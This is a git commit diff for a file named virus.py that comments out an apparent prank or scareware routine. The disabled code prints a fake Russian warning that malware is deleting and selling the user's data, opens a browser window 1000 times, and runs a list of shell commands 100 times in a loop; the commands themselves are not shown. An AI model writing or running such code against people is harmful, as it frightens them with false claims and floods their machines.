f0727781f5a9c2b9c1d367af2806cdbc4559cb6c
Maxim Bronnykov(TypeErr0r) <asdf1113k@gmail.com>
2026-03-31 18:56:51 +0300

    comments:[93-124] старый функционал

--- virus.py
+++ virus.py
@@ -90,35 +90,35 @@ class Virus:
 ]
 
 
-def removal_process():
-    print("ЗАПУСК ВРЕДОНОСНЫХ ПРОГРАМм ДЛЯ УДАЛЕНИЯ И ПРОДаЖИ ВАШИХ ДАННЫХ")
-    time.sleep(3)
+# def removal_process():
+#     print("ЗАПУСК ВРЕДОНОСНЫХ ПРОГРАМм ДЛЯ УДАЛЕНИЯ И ПРОДаЖИ ВАШИХ ДАННЫХ")
+#     time.sleep(3)
 
-    bar = progressbar.ProgressBar(max_value=len(list_virus))
-    for index in range(len(list_virus)):
-        time.sleep(0.03)
-        try:
-            print(list_virus[index])
-        except IndexError:
-            pass
-        bar.update(index)
-    else:
-        for count in range(1000): # сколько раз открыть браузер
-            webbrowser.open("wwwww.jodi.org", new=2, autoraise=True)
-
-
-def open_windows():
-    for count in range(100): # !!! range(100)
-        for index in range(len(list_command)):
-            os.system(list_command[index])
+#     bar = progressbar.ProgressBar(max_value=len(list_virus))
+#     for index in range(len(list_virus)):
+#         time.sleep(0.03)
+#         try:
+#             print(list_virus[index])
+#         except IndexError:
+#             pass
+#         bar.update(index)
+#     else:
+#         for count in range(1000): # сколько раз открыть браузер
+#             webbrowser.open("wwwww.jodi.org", new=2, autoraise=True)
 
 
-if __name__ == '__main__':
-    thread1 = threading.Thread(target=removal_process)
-    thread2 = threading.Thread(target=open_windows)
+# def open_windows():
+#     for count in range(100): # !!! range(100)
+#         for index in range(len(list_command)):
+#             os.system(list_command[index])
 
-    thread1.start()
-    thread2.start()
 
-    thread1.join()
-    thread2.join()
+# if __name__ == '__main__':
+#     thread1 = threading.Thread(target=removal_process)
+#     thread2 = threading.Thread(target=open_windows)
+
+#     thread1.start()
+#     thread2.start()
+
+#     thread1.join()
+#     thread2.join()
